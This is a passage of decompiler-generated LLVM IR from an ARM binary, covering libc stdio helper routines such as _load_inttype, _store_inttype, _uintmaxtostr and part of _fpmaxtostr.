  %v1_12b28 = and i32 %v3_12b24, 32
  %v2_12b28 = icmp eq i32 %v1_12b28, 0
  br i1 %v2_12b28, label %dec_label_pc_12b58, label %dec_label_pc_12b30

dec_label_pc_12b30:                               ; preds = %dec_label_pc_12b14, %dec_label_pc_12b24
  %v0_12b34 = call i32 @__aeabi_read_tp()
  store i32 %v0_12b34, i32* %r0.global-to-local, align 4
  %v3_12b38 = load i16, i16* @global_var_23164.175, align 2
  %v4_12b38 = sext i16 %v3_12b38 to i32
  store i32 9, i32* %r2.global-to-local, align 4
  %v3_12b40 = add i32 %v4_12b38, %v0_12b34
  %v4_12b40 = inttoptr i32 %v3_12b40 to i32*
  store i32 9, i32* %v4_12b40, align 4
  br label %dec_label_pc_12b44

dec_label_pc_12b44:                               ; preds = %dec_label_pc_12b80, %dec_label_pc_12b30
  %v0_12b44 = load i32, i32* @r4, align 4
  %v1_12b44 = inttoptr i32 %v0_12b44 to i16*
  %v2_12b44 = load i16, i16* %v1_12b44, align 2
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_12b4c = or i16 %v2_12b44, 8
  store i16 %v1_12b4c, i16* %v1_12b44, align 2
  br label %bb11

dec_label_pc_12b58:                               ; preds = %dec_label_pc_12b24
  %tmp14 = urem i16 %v2_12b24, 4
  %v2_12b58 = icmp eq i16 %tmp14, 0
  br i1 %v2_12b58, label %dec_label_pc_12bb4, label %dec_label_pc_12b60

dec_label_pc_12b60:                               ; preds = %dec_label_pc_12b58
  %v1_12b60 = and i32 %v3_12b24, 4
  store i32 %v1_12b60, i32* @r1, align 4
  %v2_12b60 = icmp eq i32 %v1_12b60, 0
  br i1 %v2_12b60, label %dec_label_pc_12b68, label %dec_label_pc_12b98

dec_label_pc_12b68:                               ; preds = %dec_label_pc_12b60
  %v1_12b68 = add i32 %v0_12b68, 20
  %v2_12b68 = inttoptr i32 %v1_12b68 to i32*
  %v3_12b68 = load i32, i32* %v2_12b68, align 4
  store i32 %v3_12b68, i32* %r2.global-to-local, align 4
  %v1_12b6c = add i32 %v0_12b68, 16
  %v2_12b6c = inttoptr i32 %v1_12b6c to i32*
  %v3_12b6c = load i32, i32* %v2_12b6c, align 4
  %v9_12b70 = icmp eq i32 %v3_12b68, %v3_12b6c
  br i1 %v9_12b70, label %dec_label_pc_12b78, label %dec_label_pc_12b80

dec_label_pc_12b78:                               ; preds = %dec_label_pc_12b68
  %v1_12b78 = and i32 %v3_12b24, 2
  %v2_12b78 = icmp eq i32 %v1_12b78, 0
  br i1 %v2_12b78, label %dec_label_pc_12b98, label %dec_label_pc_12b80

dec_label_pc_12b80:                               ; preds = %dec_label_pc_12b68, %dec_label_pc_12b78
  %v1_12b80 = and i32 %v3_12b24, 1024
  %tmp12 = udiv i32 %v1_12b80, 1024
  %tmp13 = add nuw nsw i32 %tmp12, 1
  store i32 %tmp13, i32* %r2.global-to-local, align 4
  %v0_12b8c = call i32 @__GI_fseek()
  store i32 %v0_12b8c, i32* %r0.global-to-local, align 4
  %v2_12b90 = icmp eq i32 %v0_12b8c, 0
  br i1 %v2_12b90, label %.dec_label_pc_12b98_crit_edge, label %dec_label_pc_12b44

.dec_label_pc_12b98_crit_edge:                    ; preds = %dec_label_pc_12b80
  %v0_12b98.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_12b98

dec_label_pc_12b98:                               ; preds = %.dec_label_pc_12b98_crit_edge, %dec_label_pc_12b60, %dec_label_pc_12b78
  %v2_12ba4 = phi i32 [ %v0_12b98.pre, %.dec_label_pc_12b98_crit_edge ], [ %v0_12b68, %dec_label_pc_12b60 ], [ %v0_12b68, %dec_label_pc_12b78 ]
  %v1_12b98 = inttoptr i32 %v2_12ba4 to i16*
  %v2_12b98 = load i16, i16* %v1_12b98, align 2
  %v1_12b9c = add i32 %v2_12ba4, 8
  %v2_12b9c = inttoptr i32 %v1_12b9c to i32*
  %v3_12b9c = load i32, i32* %v2_12b9c, align 4
  store i32 %v3_12b9c, i32* %r2.global-to-local, align 4
  %v1_12ba0 = and i16 %v2_12b98, -4
  store i16 %v1_12ba0, i16* %v1_12b98, align 2
  %v0_12ba8 = load i32, i32* %r2.global-to-local, align 4
  %v1_12ba8 = load i32, i32* @r4, align 4
  %v2_12ba8 = add i32 %v1_12ba8, 20
  %v3_12ba8 = inttoptr i32 %v2_12ba8 to i32*
  store i32 %v0_12ba8, i32* %v3_12ba8, align 4
  %v0_12bac = load i32, i32* %r2.global-to-local, align 4
  %v1_12bac = load i32, i32* @r4, align 4
  %v2_12bac = add i32 %v1_12bac, 24
  %v3_12bac = inttoptr i32 %v2_12bac to i32*
  store i32 %v0_12bac, i32* %v3_12bac, align 4
  %v0_12bb0 = load i32, i32* %r2.global-to-local, align 4
  %v1_12bb0 = load i32, i32* @r4, align 4
  %v2_12bb0 = add i32 %v1_12bb0, 16
  %v3_12bb0 = inttoptr i32 %v2_12bb0 to i32*
  store i32 %v0_12bb0, i32* %v3_12bb0, align 4
  %v0_12bb4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_12bb4

dec_label_pc_12bb4:                               ; preds = %dec_label_pc_12b58, %dec_label_pc_12b98
  %v2_12bc0 = phi i32 [ %v0_12b68, %dec_label_pc_12b58 ], [ %v0_12bb4.pre, %dec_label_pc_12b98 ]
  %v1_12bb4 = inttoptr i32 %v2_12bc0 to i16*
  %v2_12bb4 = load i16, i16* %v1_12bb4, align 2
  %v3_12bb4 = zext i16 %v2_12bb4 to i32
  %v1_12bb8 = or i16 %v2_12bb4, 64
  %v1_12bbc = and i32 %v3_12bb4, 2816
  store i32 %v1_12bbc, i32* %r0.global-to-local, align 4
  %v2_12bbc = icmp eq i32 %v1_12bbc, 0
  store i16 %v1_12bb8, i16* %v1_12bb4, align 2
  br i1 %v2_12bbc, label %bb10, label %.thread1

bb10:                                             ; preds = %dec_label_pc_12bb4
  %v1_12bc4 = load i32, i32* @r4, align 4
  %v2_12bc4 = add i32 %v1_12bc4, 12
  %v3_12bc4 = inttoptr i32 %v2_12bc4 to i32*
  %v4_12bc4 = load i32, i32* %v3_12bc4, align 4
  %v3_12bc8 = add i32 %v1_12bc4, 28
  %v4_12bc8 = inttoptr i32 %v3_12bc8 to i32*
  store i32 %v4_12bc4, i32* %v4_12bc8, align 4
  br label %bb11

.thread1:                                         ; preds = %dec_label_pc_12bb4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb11

bb11:                                             ; preds = %bb10, %dec_label_pc_12b44, %.thread1
  %v2_12bd0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_12bd0, i32* @r4, align 4
  %v1_12bd4 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_12bd4

; uselistorder directives
  uselistorder i32 %v2_12ba4, { 1, 0 }
  uselistorder i32 %v0_12b68, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v4_12b04, { 0, 2, 1 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 6, 4, 5 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1, 4, 3, 5 }
  uselistorder i16* %arg1, { 1, 0, 2 }
  uselistorder label %bb11, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12bb4, { 1, 0 }
  uselistorder label %dec_label_pc_12b98, { 0, 2, 1 }
  uselistorder label %dec_label_pc_12b80, { 1, 0 }
  uselistorder label %dec_label_pc_12b30, { 1, 0 }
  uselistorder label %dec_label_pc_12b24, { 1, 0 }
}

define i32 @_load_inttype() local_unnamed_addr {
entry:
  %v0_12bdc = load i32, i32* @r2, align 4
  %v1_12bdc = icmp slt i32 %v0_12bdc, 0
  %v0_12be0 = load i32, i32* @r0, align 4
  %v1_12be4 = and i32 %v0_12be0, 2048
  %v2_12c18 = icmp eq i32 %v1_12be4, 0
  br i1 %v1_12bdc, label %dec_label_pc_12c18, label %dec_label_pc_12bec

dec_label_pc_12bec:                               ; preds = %entry
  br i1 %v2_12c18, label %dec_label_pc_12bf4, label %dec_label_pc_12c20

dec_label_pc_12bf4:                               ; preds = %dec_label_pc_12bec
  %v7_12bf4 = icmp eq i32 %v0_12be0, 256
  %v0_12bf8 = load i32, i32* @r1, align 4
  %v1_12bf8 = inttoptr i32 %v0_12bf8 to i32*
  %v2_12bf8 = load i32, i32* %v1_12bf8, align 4
  %v2_12bfc = urem i32 %v2_12bf8, 256
  %v2_12bfc.v2_12bf8 = select i1 %v7_12bf4, i32 %v2_12bfc, i32 %v2_12bf8
  br i1 %v7_12bf4, label %.thread, label %dec_label_pc_12c04

dec_label_pc_12c04:                               ; preds = %dec_label_pc_12bf4
  %v7_12c04 = icmp eq i32 %v0_12be0, 512
  br i1 %v7_12c04, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_12c04
  %v4_12c0c = urem i32 %v2_12bfc.v2_12bf8, 65536
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_12c04, %dec_label_pc_12bf4, %bb
  %v1_12c14 = phi i32 [ %v2_12bf8, %dec_label_pc_12c04 ], [ %v2_12bfc, %dec_label_pc_12bf4 ], [ %v4_12c0c, %bb ]
  store i32 0, i32* @r1, align 4
  ret i32 %v1_12c14

dec_label_pc_12c18:                               ; preds = %entry
  br i1 %v2_12c18, label %dec_label_pc_12c28, label %dec_label_pc_12c20

dec_label_pc_12c20:                               ; preds = %dec_label_pc_12bec, %dec_label_pc_12c18
  %v0_12c20 = load i32, i32* @r1, align 4
  %v1_12c20 = inttoptr i32 %v0_12c20 to i32*
  %v2_12c20 = load i32, i32* %v1_12c20, align 4
  %v3_12c20 = add i32 %v0_12c20, 4
  %v4_12c20 = inttoptr i32 %v3_12c20 to i32*
  %v5_12c20 = load i32, i32* %v4_12c20, align 4
  store i32 %v5_12c20, i32* @r1, align 4
  ret i32 %v2_12c20

dec_label_pc_12c28:                               ; preds = %dec_label_pc_12c18
  %v7_12c28 = icmp eq i32 %v0_12be0, 256
  %v0_12c2c = load i32, i32* @r1, align 4
  %v1_12c2c = inttoptr i32 %v0_12c2c to i32*
  %v2_12c2c = load i32, i32* %v1_12c2c, align 4
  br i1 %v7_12c28, label %.thread1, label %dec_label_pc_12c3c

.thread1:                                         ; preds = %dec_label_pc_12c28
  %v4_12c30 = mul i32 %v2_12c2c, 16777216
  %v4_12c34 = sdiv i32 %v4_12c30, 16777216
  br label %.thread3

dec_label_pc_12c3c:                               ; preds = %dec_label_pc_12c28
  %v7_12c3c = icmp eq i32 %v0_12be0, 512
  br i1 %v7_12c3c, label %bb9, label %.thread3

bb9:                                              ; preds = %dec_label_pc_12c3c
  %v4_12c40 = mul i32 %v2_12c2c, 65536
  %v4_12c44 = sdiv i32 %v4_12c40, 65536
  br label %.thread3

.thread3:                                         ; preds = %.thread1, %dec_label_pc_12c3c, %bb9
  %v0_12c48 = phi i32 [ %v2_12c2c, %dec_label_pc_12c3c ], [ %v4_12c34, %.thread1 ], [ %v4_12c44, %bb9 ]
  %v3_12c48 = ashr i32 %v0_12c48, 31
  store i32 %v3_12c48, i32* @r1, align 4
  ret i32 %v0_12c48

; uselistorder directives
  uselistorder i32 %v0_12c48, { 1, 0 }
  uselistorder i32 %v2_12c2c, { 2, 0, 1 }
  uselistorder i32 %v2_12bfc, { 1, 0 }
  uselistorder i32 %v2_12bf8, { 1, 2, 0 }
  uselistorder i1 %v2_12c18, { 1, 0 }
  uselistorder label %.thread3, { 2, 1, 0 }
  uselistorder label %dec_label_pc_12c20, { 1, 0 }
  uselistorder label %.thread, { 2, 0, 1 }
}

define i32 @_store_inttype(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %tmp = trunc i32 %arg3 to i16
  store i32 %arg2, i32* @r1, align 4
  %tmp2 = ptrtoint i16* %arg1 to i32
  %v7_12c50 = icmp eq i32 %arg2, 256
  store i1 %v7_12c50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12c50, label %bb, label %bb4

bb:                                               ; preds = %entry
  %v3_12c54 = trunc i32 %arg3 to i8
  %tmp3 = bitcast i16* %arg1 to i8*
  store i8 %v3_12c54, i8* %tmp3, align 1
  %v1_12c58.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %bb4

bb4:                                              ; preds = %entry, %bb
  %v1_12c58 = phi i1 [ false, %entry ], [ %v1_12c58.pre, %bb ]
  %v0_12c58 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v1_12c58, i32 %v0_12c58)
  %v7_12c5c = icmp eq i32 %arg2, 2048
  store i1 %v7_12c5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12c5c, label %dec_label_pc_12c64, label %dec_label_pc_12c6c

dec_label_pc_12c64:                               ; preds = %bb4
  %tmp5 = bitcast i16* %arg1 to i32*
  store i32 %arg3, i32* %tmp5, align 4
  %v5_12c64 = add i32 %tmp2, 4
  %v6_12c64 = inttoptr i32 %v5_12c64 to i32*
  store i32 %arg4, i32* %v6_12c64, align 4
  ret i32 %tmp2

dec_label_pc_12c6c:                               ; preds = %bb4
  %v7_12c6c = icmp eq i32 %arg2, 512
  store i1 %v7_12c6c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12c6c, label %bb6, label %.thread

bb6:                                              ; preds = %dec_label_pc_12c6c
  store i16 %tmp, i16* %arg1, align 2
  br label %bb8

.thread:                                          ; preds = %dec_label_pc_12c6c
  %tmp7 = bitcast i16* %arg1 to i32*
  store i32 %arg3, i32* %tmp7, align 4
  br label %bb8

bb8:                                              ; preds = %bb6, %.thread
  ret i32 %tmp2

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0, 2, 3 }
  uselistorder i16* %arg1, { 2, 0, 3, 1, 4 }
  uselistorder label %bb8, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @_uintmaxtostr(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %tmp21 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp21, i32* %r7.global-to-local, align 4
  %v1_12c88 = icmp slt i32 %tmp21, 0
  %v2_12c88 = icmp eq i32 %tmp21, 0
  store i1 %v2_12c88, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* %r8.global-to-local, align 4
  %v0_12c90 = load i32, i32* @r2, align 4
  store i32 %v0_12c90, i32* %r5.global-to-local, align 4
  %v0_12c94 = load i32, i32* @r3, align 4
  store i32 %v0_12c94, i32* %r6.global-to-local, align 4
  br i1 %v1_12c88, label %dec_label_pc_12c9c, label %dec_label_pc_12cbc

dec_label_pc_12c9c:                               ; preds = %entry
  %v1_12c9c = icmp slt i32 %v0_12c94, 0
  %v2_12c9c = icmp eq i32 %v0_12c94, 0
  store i1 %v2_12c9c, i1* %cpsr_z.global-to-local, align 1
  %v1_12ca0 = sub i32 0, %tmp21
  store i32 %v1_12ca0, i32* %r7.global-to-local, align 4
  br i1 %v1_12c9c, label %dec_label_pc_12ca8, label %dec_label_pc_12cbc

dec_label_pc_12ca8:                               ; preds = %dec_label_pc_12c9c
  %v1_12cac = sub i32 0, %v0_12c90
  store i32 %v1_12cac, i32* %r5.global-to-local, align 4
  %v2_12cac = icmp eq i32 %v0_12c90, 0
  %v2_12cb0 = icmp eq i1 %v2_12cac, false
  %v5_12cb0 = sext i1 %v2_12cb0 to i32
  %v6_12cb0 = sub i32 %v5_12cb0, %v0_12c94
  store i32 %v6_12cb0, i32* %r6.global-to-local, align 4
  %v19_12cb0 = icmp eq i32 %v6_12cb0, 0
  store i1 %v19_12cb0, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_12cc4

dec_label_pc_12cbc:                               ; preds = %dec_label_pc_12c9c, %entry
  br label %dec_label_pc_12cc4

dec_label_pc_12cc4:                               ; preds = %dec_label_pc_12ca8, %dec_label_pc_12cbc
  %storemerge = phi i8 [ 0, %dec_label_pc_12cbc ], [ 1, %dec_label_pc_12ca8 ]
  store i32 0, i32* %sl.global-to-local, align 4
  store i8 0, i8* %arg1, align 1
  %v0_12ccc = load i32, i32* %r7.global-to-local, align 4
  %v2_12cd4 = udiv i32 -1, %v0_12ccc
  store i32 %v2_12cd4, i32* %fp.global-to-local, align 4
  %v3_12ce4 = urem i32 -1, %v0_12ccc
  %v1_12ce8 = add i32 %v3_12ce4, 1
  store i32 %v1_12ce8, i32* %sb.global-to-local, align 4
  %v9_12cec = icmp eq i32 %v1_12ce8, %v0_12ccc
  store i1 %v9_12cec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_12cec, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_12cc4
  %v1_12cf0 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v1_12cf0, i32* %sb.global-to-local, align 4
  %v2_12cf4 = add i32 %v2_12cd4, 1
  store i32 %v2_12cf4, i32* %fp.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_12cc4, %bb
  %v0_12cf8 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_12cf8, i32* %sl.global-to-local, align 4
  %v0_12cfc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_12cfc, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_12d00

dec_label_pc_12d00thread-pre-split:               ; preds = %bb25
  %v0_12d00.pr = load i32, i32* %sl.global-to-local, align 4
  %v0_12d04.pre = load i32, i32* %r6.global-to-local, align 4
  %v0_12d08.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_12d00

dec_label_pc_12d00:                               ; preds = %dec_label_pc_12d00thread-pre-split, %.thread
  %v0_12d84 = phi i32 [ %v0_12d08.pre, %dec_label_pc_12d00thread-pre-split ], [ %v0_12ccc, %.thread ]
  %v0_12d7c = phi i32 [ %v0_12d04.pre, %dec_label_pc_12d00thread-pre-split ], [ %v0_12cfc, %.thread ]
  %v0_12d18 = phi i32 [ %v0_12d00.pr, %dec_label_pc_12d00thread-pre-split ], [ %v0_12cf8, %.thread ]
  %v2_12d00 = icmp eq i32 %v0_12d18, 0
  store i1 %v2_12d00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12d00, label %dec_label_pc_12d78, label %dec_label_pc_12d10

dec_label_pc_12d10:                               ; preds = %dec_label_pc_12d00
  %v2_12d14 = udiv i32 %v0_12d18, %v0_12d84
  %v3_12d14 = urem i32 %v0_12d18, %v0_12d84
  store i32 %v2_12d14, i32* %sl.global-to-local, align 4
  %v2_12d34 = udiv i32 %v0_12d7c, %v0_12d84
  %v3_12d34 = urem i32 %v0_12d7c, %v0_12d84
  %v0_12d38 = load i32, i32* %sb.global-to-local, align 4
  %v2_12d38 = mul i32 %v0_12d38, %v3_12d14
  %v2_12d40 = add i32 %v2_12d38, %v3_12d34
  store i32 %v2_12d40, i32* %r5.global-to-local, align 4
  %v0_12d4c = load i32, i32* %fp.global-to-local, align 4
  %v2_12d4c = mul i32 %v0_12d4c, %v3_12d14
  %v2_12d54 = add i32 %v2_12d4c, %v2_12d34
  %v2_12d5c = udiv i32 %v2_12d40, %v0_12d84
  %v2_12d64 = add i32 %v2_12d54, %v2_12d5c
  br label %dec_label_pc_12d90

dec_label_pc_12d78:                               ; preds = %dec_label_pc_12d00
  %v2_12d78 = udiv i32 %v0_12d7c, %v0_12d84
  br label %dec_label_pc_12d90

dec_label_pc_12d90:                               ; preds = %dec_label_pc_12d10, %dec_label_pc_12d78
  %storemerge28 = phi i32 [ %v2_12d78, %dec_label_pc_12d78 ], [ %v2_12d64, %dec_label_pc_12d10 ]
  %v0_12dac = phi i32 [ %v2_12d78, %dec_label_pc_12d78 ], [ %v2_12d64, %dec_label_pc_12d10 ]
  %v1_12dac = phi i32 [ 0, %dec_label_pc_12d78 ], [ %v2_12d14, %dec_label_pc_12d10 ]
  %v2_12d40.pn = phi i32 [ %v0_12d7c, %dec_label_pc_12d78 ], [ %v2_12d40, %dec_label_pc_12d10 ]
  store i32 %storemerge28, i32* %r6.global-to-local, align 4
  %v0_12d98 = urem i32 %v2_12d40.pn, %v0_12d84
  %v2_12d94 = icmp ugt i32 %v0_12d98, 8
  %v7_12d94 = icmp eq i32 %v0_12d98, 9
  store i1 %v7_12d94, i1* %cpsr_z.global-to-local, align 1
  %v1_12d9c = add i32 %v0_12d98, 48
  %v0_12da4 = load i32, i32* %r8.global-to-local, align 4
  %v1_12da4 = add i32 %v0_12da4, -1
  store i32 %v1_12da4, i32* %r8.global-to-local, align 4
  %v2_12da8 = xor i1 %v7_12d94, true
  %v3_12da8 = and i1 %v2_12d94, %v2_12da8
  %extract.t = trunc i32 %v1_12d9c to i8
  br i1 %v3_12da8, label %bb24, label %bb25

bb24:                                             ; preds = %dec_label_pc_12d90
  %v2_12d98 = add i32 %v0_12d98, %tmp11
  %extract.t9 = trunc i32 %v2_12d98 to i8
  br label %bb25

bb25:                                             ; preds = %dec_label_pc_12d90, %bb24
  %v0_12db0.off0 = phi i8 [ %extract.t, %dec_label_pc_12d90 ], [ %extract.t9, %bb24 ]
  %v2_12dac = or i32 %v0_12dac, %v1_12dac
  %v4_12dac = icmp eq i32 %v2_12dac, 0
  store i1 %v4_12dac, i1* %cpsr_z.global-to-local, align 1
  %v3_12db0 = inttoptr i32 %v1_12da4 to i8*
  store i8 %v0_12db0.off0, i8* %v3_12db0, align 1
  %v0_12db4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_12db4, label %dec_label_pc_12db8, label %dec_label_pc_12d00thread-pre-split

dec_label_pc_12db8:                               ; preds = %bb25
  %v4_12db810 = zext i8 %storemerge to i32
  store i32 %v4_12db810, i32* @r3, align 4
  %v2_12dbc = icmp eq i8 %storemerge, 0
  store i1 %v2_12dbc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12dbc, label %dec_label_pc_12db8..thread2_crit_edge, label %bb26

dec_label_pc_12db8..thread2_crit_edge:            ; preds = %dec_label_pc_12db8
  %v0_12dc8.pre = load i32, i32* %r8.global-to-local, align 4
  br label %.thread2

bb26:                                             ; preds = %dec_label_pc_12db8
  store i32 45, i32* @r3, align 4
  %v3_12dc4 = load i32, i32* %r8.global-to-local, align 4
  %v4_12dc4 = add i32 %v3_12dc4, -1
  %v5_12dc4 = inttoptr i32 %v4_12dc4 to i8*
  store i8 45, i8* %v5_12dc4, align 1
  %v6_12dc4 = load i32, i32* %r8.global-to-local, align 4
  %v7_12dc4 = add i32 %v6_12dc4, -1
  store i32 %v7_12dc4, i32* %r8.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_12db8..thread2_crit_edge, %bb26
  %v0_12dc8 = phi i32 [ %v0_12dc8.pre, %dec_label_pc_12db8..thread2_crit_edge ], [ %v7_12dc4, %bb26 ]
  ret i32 %v0_12dc8

; uselistorder directives
  uselistorder i32 %v0_12d98, { 3, 2, 1, 0 }
  uselistorder i32 %v0_12d84, { 0, 6, 1, 2, 3, 5, 4 }
  uselistorder i8 %storemerge, { 1, 0 }
  uselistorder i32 %v0_12c90, { 1, 0, 2 }
  uselistorder i32 %tmp21, { 0, 3, 2, 1 }
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32* %r7.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %fp.global-to-local, { 1, 0, 2 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %bb25, { 1, 0 }
  uselistorder label %dec_label_pc_12d90, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_12cc4, { 1, 0 }
}

define i32 @_fpmaxtostr(i32 %arg1, double %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r3.global-to-local, align 4
  %tmp = fptrunc double %arg2 to float
  %tmp160 = bitcast float %tmp to i32
  store i32 %tmp160, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg4, i32* %stack_var_0, align 4
  %stack_var_-46 = alloca i8, align 1
  %stack_var_-164 = alloca i32, align 4
  %stack_var_-47 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-42 = alloca i32, align 4
  %stack_var_-82 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-83 = alloca i32, align 4
  %stack_var_-81 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-208 = alloca i32, align 4
  %v27_12dd8 = load i32, i32* @lr, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  %v1_12de4 = add i32 %arg4, 8
  %v2_12de4 = inttoptr i32 %v1_12de4 to i8*
  %v3_12de4 = load i8, i8* %v2_12de4, align 1
  %v4_12de4 = zext i8 %v3_12de4 to i32
  store i32 %v4_12de4, i32* %sb.global-to-local, align 4
  %v1_12de8 = or i32 %v4_12de4, 32
  %v7_12dec = icmp eq i32 %v1_12de8, 97
  store i1 %v7_12dec, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg4, i32* %r0.global-to-local, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  %v1_12e04 = inttoptr i32 %arg4 to i32*
  %v2_12e04 = load i32, i32* %v1_12e04, align 4
  store i32 %v2_12e04, i32* %fp.global-to-local, align 4
  store i32 %arg4, i32* %lr.global-to-local, align 4
  %v0_12e0c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_12e0c, i32* %r6.global-to-local, align 4
  store i32 66252, i32* %ip.global-to-local, align 4
  br i1 %v7_12dec, label %bb, label %bb201

bb:                                               ; preds = %entry
  %v2_12e14 = add nuw nsw i32 %v4_12de4, 6
  store i32 %v2_12e14, i32* %r3.global-to-local, align 4
  br label %bb201

bb201:                                            ; preds = %entry, %bb
  %v1_12e24 = phi i32 [ %v0_12e0c, %entry ], [ %v2_12e14, %bb ]
  store i32 %tmp160, i32* %r5.global-to-local, align 4
  %v1_12e1c = add i32 %arg4, 12
  %v2_12e1c = inttoptr i32 %v1_12e1c to i32*
  %v3_12e1c = load i32, i32* %v2_12e1c, align 4
  store i32 %v3_12e1c, i32* %r2.global-to-local, align 4
  %v1_12e20 = add i32 %arg4, 4
  %v2_12e20 = inttoptr i32 %v1_12e20 to i32*
  %v3_12e20 = load i32, i32* %v2_12e20, align 4
  store i32 %v3_12e20, i32* @lr, align 4
  br i1 %v7_12dec, label %bb202, label %bb203

bb202:                                            ; preds = %bb201
  %v2_12e24 = urem i32 %v1_12e24, 256
  store i32 %v2_12e24, i32* %sb.global-to-local, align 4
  br label %bb203

bb203:                                            ; preds = %bb201, %bb202
  %v1_12e28 = icmp slt i32 %v2_12e04, 0
  %v2_12e28 = icmp eq i32 %v2_12e04, 0
  store i1 %v2_12e28, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23104.179 to i32), i32* %ip.global-to-local, align 4
  br i1 %v1_12e28, label %bb204, label %bb205

bb204:                                            ; preds = %bb203
  store i32 6, i32* %fp.global-to-local, align 4
  br label %bb205

bb205:                                            ; preds = %bb203, %bb204
  %v1_12e38 = and i32 %v3_12e1c, 2
  %v2_12e38 = icmp eq i32 %v1_12e38, 0
  store i1 %v2_12e38, i1* %cpsr_z.global-to-local, align 1
  store i8 0, i8* %stack_var_-46, align 1
  br i1 %v2_12e38, label %dec_label_pc_12e50, label %dec_label_pc_12e5c

dec_label_pc_12e50:                               ; preds = %bb205
  %v1_12e50 = urem i32 %v3_12e1c, 2
  %v2_12e50 = icmp eq i32 %v1_12e50, 0
  store i1 %v2_12e50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12e50, label %dec_label_pc_12e60, label %dec_label_pc_12e5c

dec_label_pc_12e5c:                               ; preds = %dec_label_pc_12e50, %bb205
  %storemerge = phi i32 [ 43, %bb205 ], [ 32, %dec_label_pc_12e50 ]
  %v0_12e5c.off0 = phi i8 [ 43, %bb205 ], [ 32, %dec_label_pc_12e50 ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  store i8 %v0_12e5c.off0, i8* %stack_var_-46, align 1
  br label %dec_label_pc_12e60

dec_label_pc_12e60:                               ; preds = %dec_label_pc_12e50, %dec_label_pc_12e5c
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 %v0_12e0c, i32* %r3.global-to-local, align 4
  store i32 %tmp160, i32* @r0, align 4
